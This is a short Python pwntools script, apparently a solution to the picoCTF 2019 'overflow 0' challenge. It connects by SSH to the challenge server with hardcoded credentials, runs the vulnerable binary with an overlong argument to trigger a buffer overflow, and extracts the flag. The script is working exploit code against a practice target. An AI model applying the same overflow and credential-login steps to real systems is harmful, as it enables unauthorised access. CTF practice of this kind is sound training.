from pwn import *
import re

try:
    session = ssh(host="2019shell1.picoctf.com",user="cse331",password="3curityishard", level=50)
    process = session.process(cwd='/problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7',executable='./vuln', argv=['./vuln','A'*200])
    recvl = process.recvall()

    flag = re.search(r"picoCTF{(.*)}", str(recvl))
    print(flag.groups()[0])
    process.close()
except:
    print('lost connection to server')
